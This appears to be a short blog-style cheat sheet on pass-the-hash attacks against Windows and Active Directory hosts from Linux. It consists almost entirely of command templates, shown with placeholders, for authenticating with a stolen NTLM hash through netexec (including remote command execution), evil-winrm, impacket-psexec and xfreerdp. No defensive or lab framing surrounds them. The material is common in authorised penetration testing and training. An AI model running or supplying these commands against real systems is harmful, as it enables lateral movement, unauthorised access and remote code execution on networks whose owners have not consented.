---
title: Linux Pass the Hash (PtH)
date: 2025-11-27 13:28:21

categories:
  - Active Directory
  - Linux
  - Post Exploitation
  - Pass the Hash (PtH)

tags:
  - netexec
  - evil-winrm
  - impacket-psexec
  - xfreerdp

cover: /img/pth.png
top_img: /img/bg-img.jpg
description:
---




# NetExec

### Domain Account

```bash
netexec smb ip -u username -d Domain -H hash
```


### Local Account

```bash
netexec smb ip -u username -H hash --local-auth
```

### Command Execution

```bash
netexec smb ip -u username -H hash  -x whoami
```

# evil-winrm


### Local Account

```bash
evil-winrm -i ip -u username -H hash
```

### Domain Account

```bash
evil-winrm -i ip -u username@domain -H hash
```


# PsExec

```bash
impacket-psexec username@ip -hashes :hash
```

# RDP

```bash
xfreerdp  /v:ip /u:username /pth:hash
```